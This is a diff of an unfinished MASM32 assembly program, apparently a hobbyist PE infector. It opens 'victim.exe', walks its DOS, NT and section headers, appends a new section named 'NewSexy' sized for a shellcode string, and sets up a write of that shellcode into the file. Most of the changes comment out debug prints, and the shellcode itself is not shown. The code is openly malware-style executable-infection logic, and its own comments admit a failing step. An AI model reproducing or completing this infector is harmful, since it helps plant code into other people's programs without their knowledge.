@@ -13,6 +13,7 @@ includelib	c:\masm32\lib\msvcrt.lib
 
 ;todo:
 ;full english var + comments
+; replace offset by addr when possible or lea
 ;dynamic loadlib shellcode
 ;listing directory
 ;non-masm version
@@ -51,7 +52,6 @@ patPutHexa									db "%x hexa", 13, 10, 0
 patPutStr 										db "%s string",13,10, 0
 
 filename 										db  "victim.exe", 0
-filename2 										db  "c:\\Documents and Settings\\chris\\victim2.exe", 0
 sectionName 									db "NewSexy", 0
 shellcodeNop									db "\x90", 0
 
@@ -84,7 +84,6 @@ start:
 
 ;long sectionSize = strlen(shellcode) + (sizeof(DWORD)); 
 ;size du shellcode +  old entrypoint  
-;save and restore non ready-to-use registers
 
 push	offset shellcode
 call		crt_strlen
@@ -139,7 +138,7 @@ push	esi
 ; Opens file for both read and write                                                                                                                                                                   
 mov	eax, GENERIC_WRITE
 or            eax, GENERIC_READ
-invoke     CreateFile,  filename1, eax, 0, 0, OPEN_EXISTING, 0, 0
+invoke     CreateFile, filename1, eax, 0, 0, OPEN_EXISTING, 0, 0
 mov	executableHandle, eax 
 cmp	eax,  INVALID_HANDLE_VALUE
 je		exitpolluteerror
@@ -156,16 +155,23 @@ mov	executableEnMemoire, eax
 cmp	eax, NULL
 je		exiterror
 
+
+
 mov	ebx, eax
 assume	ebx: ptr IMAGE_DOS_HEADER
 cmp	[ebx].e_magic, IMAGE_DOS_SIGNATURE
 jne		exitpolluteerror
 
 ;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patAddrImageDosHeader
-invoke	crt_printf, offset patPutPtr, ebx
-invoke	crt_printf, offset patImageDosHeader
-invoke	crt_printf, offset patPutPtr, [ebx]
+invoke crt_printf, offset patDebug
+invoke crt_printf, offset patPutPtr, executableEnMemoire
+invoke crt_printf, offset patPutPtr, executableHandle
+invoke crt_printf, offset patPutPtr, executableMap
+
+; invoke	crt_printf, offset patAddrImageDosHeader
+; invoke	crt_printf, offset patPutPtr, ebx
+; invoke	crt_printf, offset patImageDosHeader
+; invoke	crt_printf, offset patPutPtr, [ebx]
 ;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ; ebx += [ebx].e_lfanew
@@ -176,10 +182,10 @@ cmp	[ebx].Signature,  IMAGE_NT_SIGNATURE
 jne		exitpolluteerror
 
 ;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patAddrImageNtHeader
-invoke	crt_printf, offset patPutPtr, ebx
-invoke	crt_printf, offset patImageNtHeader
-invoke	crt_printf, offset patPutPtr, [ebx]
+; invoke	crt_printf, offset patAddrImageNtHeader
+; invoke	crt_printf, offset patPutPtr, ebx
+; invoke	crt_printf, offset patImageNtHeader
+; invoke	crt_printf, offset patPutPtr, [ebx]
 ;;;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ;PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
@@ -192,10 +198,10 @@ mov	ptrEntryPoint, esi
 add		ptrEntryPoint, 10h
 
 ;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patOldEntryPoint
-mov	eax, ptrEntryPoint
-mov	eax, [eax]
-invoke	crt_printf, offset patPutPtr, eax
+; invoke	crt_printf, offset patOldEntryPoint
+; mov	eax, ptrEntryPoint
+; mov	eax, [eax]
+; invoke	crt_printf, offset patPutPtr, eax
 ;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 
@@ -220,8 +226,8 @@ lea		edi, [ebx].FileHeader
 assume	edi :ptr IMAGE_FILE_HEADER
 
 ;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patNumberOfSections
-invoke	crt_printf, offset patPutInt,  [edi].NumberOfSections
+; invoke	crt_printf, offset patNumberOfSections
+; invoke	crt_printf, offset patPutInt,  [edi].NumberOfSections
 ;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ;PWORD pointerNumberOfSection = &infosPE->FileHeader.NumberOfSections;
@@ -238,10 +244,10 @@ assume	ebx : nothing
 
 
 ;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patAddrNumberOfSections
-invoke	crt_printf, offset patPutPtr, ebx
-mov eax, [ebx]
-invoke	crt_printf, offset patPutPtr, eax
+; invoke	crt_printf, offset patAddrNumberOfSections
+; invoke	crt_printf, offset patPutPtr, ebx
+; mov eax, [ebx]
+; invoke	crt_printf, offset patPutPtr, eax
 ;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 
@@ -250,11 +256,11 @@ invoke	crt_printf, offset patPutPtr, eax
 add		ebx, sizeof IMAGE_NT_HEADERS
 
 ;;;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patAddrImageSectionHeader
-invoke	crt_printf, offset patPutPtr, ebx
-invoke	crt_printf, offset patImageSectionHeader
-mov 	eax, [ebx]
-invoke	crt_printf, offset patPutPtr, eax
+; invoke	crt_printf, offset patAddrImageSectionHeader
+; invoke	crt_printf, offset patPutPtr, ebx
+; invoke	crt_printf, offset patImageSectionHeader
+; mov 	eax, [ebx]
+; invoke	crt_printf, offset patPutPtr, eax
 ;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 
@@ -265,11 +271,11 @@ mul 	numberOfSection
 add		ebx, eax
 
 ;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patAddrImageSectionHeader
-invoke	crt_printf, offset patPutPtr, ebx
-invoke	crt_printf, offset patImageSectionHeader
-mov	eax, [ebx]
-invoke	crt_printf, offset patPutPtr, eax
+; invoke	crt_printf, offset patAddrImageSectionHeader
+; invoke	crt_printf, offset patPutPtr, ebx
+; invoke	crt_printf, offset patImageSectionHeader
+; mov	eax, [ebx]
+; invoke	crt_printf, offset patPutPtr, eax
 ;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ; we can now set our new section
@@ -295,10 +301,10 @@ call		crt_strcpy
 ;newSection->Misc.VirtualSize = AligneOn(sectionAlignment, sectionSize);
 
 ;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patSizeOfSection
-invoke	crt_printf, offset patPutInt, sectionSize
-invoke	crt_printf, offset patSectionAlignment
-invoke	crt_printf, offset patPutInt, sectionAlignment
+; invoke	crt_printf, offset patSizeOfSection
+; invoke	crt_printf, offset patPutInt, sectionSize
+; invoke	crt_printf, offset patSectionAlignment
+; invoke	crt_printf, offset patPutInt, sectionAlignment
 ;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 
@@ -308,10 +314,10 @@ call		alignOn
 mov	 [ebx].Misc, eax
 
 ;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patSectionAlignment
-invoke	crt_printf, offset patPutHexa, sectionAlignment
-invoke	crt_printf, offset patSectionVirtualSize
-invoke 	crt_printf, offset patPutHexa, [ebx].Misc
+; invoke	crt_printf, offset patSectionAlignment
+; invoke	crt_printf, offset patPutHexa, sectionAlignment
+; invoke	crt_printf, offset patSectionVirtualSize
+; invoke 	crt_printf, offset patPutHexa, [ebx].Misc
 ;;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 
@@ -343,8 +349,8 @@ call		alignOn
 mov	[ebx].VirtualAddress, eax
 
 ;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patNewSectionVirtualAddr
-invoke	crt_printf, offset patPutPtr, [ebx].VirtualAddress
+; invoke	crt_printf, offset patNewSectionVirtualAddr
+; invoke	crt_printf, offset patPutPtr, [ebx].VirtualAddress
 ;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 
@@ -355,8 +361,8 @@ call		alignOn
 mov 	[ebx].SizeOfRawData, eax 
 
 ;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patSizeOfRawData 
-invoke	crt_printf, offset patPutHexa, [ebx].SizeOfRawData
+; invoke	crt_printf, offset patSizeOfRawData 
+; invoke	crt_printf, offset patPutHexa, [ebx].SizeOfRawData
 ;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ;notreSection->PointerToRawData = AligneSur(fileAlignment,(infosSection->SizeOfRawData + infosSection->PointerToRawData));
@@ -416,6 +422,12 @@ mov	sizeDifference, eax
 invoke	crt_printf, offset patSizeDifference 
 invoke	crt_printf, offset patPutHexa, sizeDifference
 invoke	crt_printf, offset patPutInt, sizeDifference
+
+
+invoke crt_printf, offset patDebug
+invoke crt_printf, offset patPutPtr, executableEnMemoire
+invoke crt_printf, offset patPutPtr, executableHandle
+invoke crt_printf, offset patPutPtr, executableMap
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 push	[ebx].PointerToRawData										;save PointerToRawData
@@ -435,6 +447,14 @@ je		exitpolluteerror
 ;Currently strangely Failing here
 ;CreateFile( argv[1] , GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
 ;invoke 	CreateFile, offset filename, GENERIC_WRITE,  FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
+;invoke	crt_printf, offset patPutStr, offset filename
+;invoke	crt_printf, offset patPutInt, INVALID_HANDLE_VALUE
+
+;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+invoke	crt_printf, offset patDebug
+call		GetLastError
+invoke	crt_printf, offset patPutInt,  eax
+;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 push	0
 push	FILE_ATTRIBUTE_NORMAL
@@ -442,17 +462,25 @@ push	OPEN_ALWAYS
 push	0
 push	FILE_SHARE_WRITE
 push	GENERIC_WRITE
-lea		eax, filename2
-push	eax
+push	filename1
 call		CreateFile
 
-mov 	filePointer, eax													
-cmp	eax, INVALID_HANDLE_VALUE
+;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; invoke	crt_printf, offset patDebug
+; call		GetLastError
+; invoke	crt_printf, offset patPutInt,  eax
+;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+
+;mov 	filePointer, eax													
+;cmp	eax, INVALID_HANDLE_VALUE
+cmp	eax, -1
 je		exitpolluteerror
+
 
 pop		eax 													; restore PointerToRawData
 invoke	SetFilePointer, filePointer, eax, 0, FILE_BEGIN
-;cmp	eax, INVALID_SET_FILE_POINTER ROFL@MICROSOFT
+;cmp	eax, INVALID_SET_FILE_POINTER + GetLastError ROFL@MICROSOFT
 ;je		exitpolluteerror
 
 ; WriteFile, filePointer, offset shellcode, (strlen(shellcode) + 0), &sizee, NULL				;writing the shellcode on pointerToRawData
